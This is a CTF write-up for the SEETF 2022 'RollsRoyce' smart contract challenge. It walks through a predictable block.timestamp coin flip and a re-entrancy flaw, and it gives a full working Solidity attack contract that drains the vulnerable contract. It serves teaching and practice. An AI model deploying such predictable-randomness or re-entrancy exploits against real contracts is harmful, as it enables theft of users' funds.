---
title: "SEETF 2022 Smart Contract Challenge - RollsRoyce"
destription: "A Smart Contract challenge during SEETF 2022 that required exploiting a pseudorandomness vulnerability and a re-entrancy attack"
date: 2022-07-03T15:54:11+08:00

tags:
    - ctf
    - seetf-2022
    - blockchain
    - smart-contracts
    - re-entrancy
    - pseudorandomness

categories:
    - ctf
    - writeup
    - seetf-2022
draft: false
comments: true
ShowToc: true
TocOpen: true
---

## RollsRoyce Challenge Description

This was a smart-contract challenge that was part of the recent [SEETF 2022](https://ctftime.org/event/1543/) hosted by the [Social Engineering Experts](https://seetf.sg/seetf/). I played this together under [3_Blind_Mice](https://ctftime.org/team/190705), a random team made together with [@chuayupeng](https://github.com/chuayupeng) and [ethon](https://github.com/gnosis-agora) for pure fun and memes.

Like all the other smart-contract challenges in this CTF, a vulnerable contract was deployed onto [SEETF's very own private blockchain network](https://github.com/Social-Engineering-Experts/ETH-Guide).

Solving this challenge required exploiting 2 vulnerabilities, a pseudorandomness vulnerability that leveraged on `block.timestamp` being used as a random generator, and a [re-entrancy attack](https://hackernoon.com/hack-solidity-reentrancy-attack). 

### Contract Code

We are given this `RollsRoyce.sol` contract as shown below:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract RollsRoyce {
    enum CoinFlipOption {
        HEAD,
        TAIL
    }

    address private bettingHouseOwner;
    address public currentPlayer;
    CoinFlipOption userGuess;
    mapping(address => uint) playerConsecutiveWins;
    mapping(address => bool) claimedPrizeMoney;
    mapping(address => uint) playerPool;

    constructor() payable {
        bettingHouseOwner = msg.sender;
    }

    receive() external payable {}

    function guess(CoinFlipOption _guess) external payable {
        require(currentPlayer == address(0), "There is already a player");
        require(msg.value == 1 ether, "To play it needs to be 1 ether");

        currentPlayer = msg.sender;
        depositFunds(msg.sender);
        userGuess = _guess;
    }

    function revealResults() external {
        require(
            currentPlayer == msg.sender,
            "Only the player can reveal the results"
        );

        CoinFlipOption winningOption = flipCoin();

        if (userGuess == winningOption) {
            playerConsecutiveWins[currentPlayer] =
                playerConsecutiveWins[currentPlayer] +
                1;
        } else {
            playerConsecutiveWins[currentPlayer] = 0;
        }
        currentPlayer = address(0);
    }

    function flipCoin() private view returns (CoinFlipOption) {
        return
            CoinFlipOption(
                uint(
                    keccak256(abi.encodePacked(block.timestamp ^ 0x1F2DF76A6))
                ) % 2
            );
    }

    function viewWins(address _addr) public view returns (uint) {
        return playerConsecutiveWins[_addr];
    }

    function depositFunds(address _to) internal {
        playerPool[_to] += msg.value;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

        (bool success, ) = recipient.call{value: amount}("");
    }

    function withdrawPrizeMoney(address _to) public payable {
        require(
            msg.sender == _to,
            "Only the player can withdraw the prize money"
        );
        require(
            playerConsecutiveWins[_to] >= 3,
            "You need to win 3 or more consecutive games to claim the prize money"
        );

        if (playerConsecutiveWins[_to] >= 3) {
            uint prizeMoney = playerPool[_to];
            playerPool[_to] = 0;
            sendValue(payable(_to), prizeMoney);
        }
    }

    function withdrawFirstWinPrizeMoneyBonus() external {
        require(
            !claimedPrizeMoney[msg.sender],
            "You have already claimed the first win bonus"
        );
        playerPool[msg.sender] += 1 ether;
        withdrawPrizeMoney(msg.sender);
        claimedPrizeMoney[msg.sender] = true;
    }

    function isSolved() public view returns (bool) {
        // Return true if the game is solved
        return address(this).balance == 0;
    }
}

```


### Contract Functions
Based on the source code of the contract itself, we can learn a couple of things

- The contract is basically a coin flipping game.
- The `guess()` function essentially allows us to enter the game and make a guess, making the address who called this function the `currentPlayer`.
- The `revealResults()` function makes a `flipCoin()` and uses that as the comparison against the `guess()`.
- If you win a coin flip 3 times consecutively, you can claim claim all the ether you've won plus 1 additional ether through `WithdrawFirstWinPrizeMoneyBonus()`
  - This additional 1 ether bonus only applies on your first win.
- We solve the problem when we drain all the funds from the contract itself.
  - We can determine the amount of funds in the contract by running `web3.eth.getBalance(contractAddress)`, which tells us that there's 5 ether in the contract itself when we deploy the contract
  ![image](https://user-images.githubusercontent.com/33711159/173046447-fdef0e74-81ea-49c5-b039-bcf2459f3fb4.png)



## Exploit 1 - Predictable Block Timestamp
Let's take a look at how the results of the `flipCoin()` function gets generated
```solidity
function flipCoin() private view returns (CoinFlipOption) {
    return
        CoinFlipOption(
            uint(
                keccak256(abi.encodePacked(block.timestamp ^ 0x1F2DF76A6))
            ) % 2
        );
}
```

- `keccak256(abi.encodePacked(block.timestamp ^ 0x1F2Df76A6))` -- According to the [documentation](https://docs.soliditylang.org/en/latest/units-and-global-variables.html?highlight=block#block-and-transaction-properties:~:text=keccak256(abi.encodePacked(a%2C%20b))%20is%20a%20way%20to%20compute%20the%20hash%20of%20structured%20data), this computes the hash of some structured data. 

What is interesting to us is the use of `block.timestamp` over here, which according to the [solidity documentation](https://docs.soliditylang.org/en/latest/units-and-global-variables.html?highlight=block#block-and-transaction-properties), is essentially the current block's timestamp in seconds --> in other words, a deterministic value.

So I guess the question is, how do we exploit this idea? When a transaction is made, it gets stored onto a block and it is this particular block's timestamp that we are interested in. 

In order to exploit this, we first got to call the `guess()` function along with the `revealResults()` function *in the same transaction*, so something like this:

```solidity
contract Attack {
    RollsRoyce victim;
    address owner;

    constructor(address payable _addr) public payable {
        owner = msg.sender;
        victim = RollsRoyce(_addr);
    }

    function flipCoin() private view returns (RollsRoyce.CoinFlipOption) {
        return
            RollsRoyce.CoinFlipOption(
                uint256(
                    keccak256(abi.encodePacked(block.timestamp ^ 0x1F2DF76A6))
                ) % 2
            );
    }

    function win() public payable {
        require(address(this).balance >= 1 ether, "Send contract some ether");
        RollsRoyce.CoinFlipOption result = flipCoin();
        victim.guess{value: 1 ether}(result);
        victim.revealResults();
    }
}
```
Essentially, the `win()` function basically tries to call `guess()` and `revealResults()` in the same transaction, therefore making `block.timestamp` a deterministic value which allows us to predict the result of the `flipCoin()` function and making an accurate `guess()`.

We can then deploy this `Attack` contract and transfer some ether to it. We can verify that our `win()` function is indeed working as intended by calling the function multiple times and verifying against the `viewWins()` function in the deployed RollsRoyce contract as shown below

![image](https://user-images.githubusercontent.com/33711159/172994068-ec4c683c-64df-4d5f-89c4-19c772dbc399.png)

Great! We have a surefireway to win the coin flips now by exploiting the usage of a predictable `block.timestamp`!

## Exploit 2 - Re-entrancy Attack

A classic attack when it comes to exploiting smart contracts - a re-entrancy attack in short basically exploits the idea of a victim contract blindly makes an external call to a malicious contract. In this challenge, the re-entrancy attack was exploitable through the `withdrawFirstWinPrizeMoneyBonus()` function as shown below:
```solidity
function withdrawFirstWinPrizeMoneyBonus() external {
    require(
        !claimedPrizeMoney[msg.sender],
        "You have already claimed the first win bonus"
    );
    playerPool[msg.sender] += 1 ether;
    withdrawPrizeMoney(msg.sender);
    claimedPrizeMoney[msg.sender] = true;
}
```
When a player calls the `withdrawFirstWinPrizeMoneyBonus()` after winning the game, the contract will essentially add an additional 1 ether to the player's prize pool via `playerPool[msg.sender] += 1 ether`. The thing is, this function can only be called once by the player as seen in the first statement `require(!claimedPrizeMoney[msg.sender]`. `claimedPrizeMoney[msg.sender]` gets set to `true` at the end of the function in the last line, after `withdrawPrizeMoney()`.

Now let's look at what `withdrawPrizeMoney()` does:
```solidity
function sendValue(address payable recipient, uint256 amount) internal {
    require(
        address(this).balance >= amount,
        "Address: insufficient balance"
    );

    (bool success, ) = recipient.call{value: amount}("");
}

function withdrawPrizeMoney(address _to) public payable {
    require(
        msg.sender == _to,
        "Only the player can withdraw the prize money"
    );
    require(
        playerConsecutiveWins[_to] >= 3,
        "You need to win 3 or more consecutive games to claim the prize money"
    );

    if (playerConsecutiveWins[_to] >= 3) {
        uint256 prizeMoney = playerPool[_to];
        playerPool[_to] = 0;
        sendValue(payable(_to), prizeMoney);
    }
}
```
Essentially, `withdrawPrizeMoney()` simply sends the player calling the function the amount of ether as stored in `playerPool[recipient]`, after checking that the player has won at least 3 or more times consecutively. 

So where is the vulnerability and how can it be exploited? 

When a contract sends another address some ether like seen in the `sendValue(address payable recipient, uint256 amount)` function, the contract is actually making a call to the victim's [receive()](https://docs.soliditylang.org/en/latest/contracts.html#receive-ether-function) function. In essence, we can implement the `receive()` function in a way such that it makes a recursive call back to a victim contract's exploitable function.

In this case, the exploitable function is the `withdrawFirstWinPrizeMoneyBonus()`. Lets take a look at the function calls being made when a player calls the `withdrawFirstWinPrizeMoneyBonus()` function (or at least what's important to take note of):
- `withdrawFirstWinPrizeMoneyBonus()` --> 
    - `require(!claimedPrizeMoney[msg.sender]) -->
    - `playerPool[msg.sender] += 1 ether;` --> 
    - `withdrawPrizeMoney(msg.sender);` --> 
        - `sendValue(payable(_to), prizeMoney);` --> 
    - `claimedPrizeMoney[msg.sender] = true;`


If we can somehow re-make the call to the `withdrawFirstWinPrizeMoneyBonus()` function before `claimedPrizeMoney[msg.sender]` gets set to `true`, we can essentially keep recursively calling that function until the contract has no funds, which is the aim of this challenge ultimately. In other words, we want to make a function call back to the `withdrawFirstWinPrizeMoneyBonus()` function right after receiving ether from the victim contract, something like below:
- `withdrawFirstWinPrizeMoneyBonus()` --> 
    - `require(!claimedPrizeMoney[msg.sender])` -->
    - `playerPool[msg.sender] += 1 ether;` --> 
    - `withdrawPrizeMoney(msg.sender);` --> 
        - `sendValue(payable(_to), prizeMoney);` --> 
            - `withdrawFirstWinPrizeMoneyBonus()` --> 
                - `require(!claimedPrizeMoney[msg.sender])` -->
                - `playerPool[msg.sender] += 1 ether;` --> 
                - `withdrawPrizeMoney(msg.sender);` --> 
                    - `sendValue(payable(_to), prizeMoney);` --> 
                        - .......
    - `claimedPrizeMoney[msg.sender] = true;`

We can achieve this by simply extending our `Attack` contract and implementing our own malicious `receive()` function as shown below:
```solidity
receive() external payable {
    if (victim.viewWins(address(this)) >= 3 && address(victim).balance > 0) {
        victim.withdrawFirstWinPrizeMoneyBonus();
    }
}
```

Note that we also want to check that we only trigger the vulnerable re-entrancy function if we have already won the game, and we only wish to keep drawing the funds if there are even funds to draw.

## Wrapping it all up like a Sushi Roll
Alright, now that we understand what we need to do, let's implement the full exploit contract!

```solidity
contract Attack {
    RollsRoyce victim;
    address owner;

    constructor(address payable _addr) public payable {
        owner = msg.sender;
        victim = RollsRoyce(_addr);
    }

    function flipCoin() private view returns (RollsRoyce.CoinFlipOption) {
        return
            RollsRoyce.CoinFlipOption(
                uint(
                    keccak256(abi.encodePacked(block.timestamp ^ 0x1F2DF76A6))
                ) % 2
            );
    }

    function win() public payable {
        require(address(this).balance >= 1 ether, "Send contract some ether");
        RollsRoyce.CoinFlipOption result = flipCoin();
        victim.guess{value: 1 ether}(result);
        victim.revealResults();
    }

    function pwnContract() public payable {
        for (uint i = 0; i < 3; i++) {
            win();
        }
        victim.withdrawFirstWinPrizeMoneyBonus();
    }

    receive() external payable {
        if (victim.viewWins(address(this)) >= 3 && address(victim).balance > 0) {
            victim.withdrawFirstWinPrizeMoneyBonus();
        }
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function withdrawBalance(uint amount) public {
        require(msg.sender == owner, "You not owner!");
        require(address(this).balance >= amount, "This contract has no more funds!");
        (bool success, ) = msg.sender.call{value: amount}("");
    }
}
```

For simplicity, everything can be done from within a single function call `pwnContract()` itself, which includes winning the coin flip 3 times consecutively, and also making the call to the exploitable `withdrawFirstWinPrizeMoneyBonus()` function. We simply just have to call the `pwnContract()` function, transfer 3 ether to it and then, we'd solve the challenge.

To also make things more realistic, we can also implement a `withdrawBalance()` function to withdraw funds from the contract (otherwise the funds are simply stuck in the contract and lost forever once deployed!)

Once we call `pwnContract()`, we can see that challenge has been solved and isSolved() has been set to true!

![image](https://user-images.githubusercontent.com/33711159/173044701-0a860127-b0f7-436e-9191-da44ab4f23f2.png)

Now let's go grab our flag :)

![image](https://user-images.githubusercontent.com/33711159/173044866-3814bcf0-144b-44a3-adcd-98cb18aca9cd.png)
`SEE{R4nd0m_R0yC3_6390bc0863295e58c2922f4fca50dab9}`

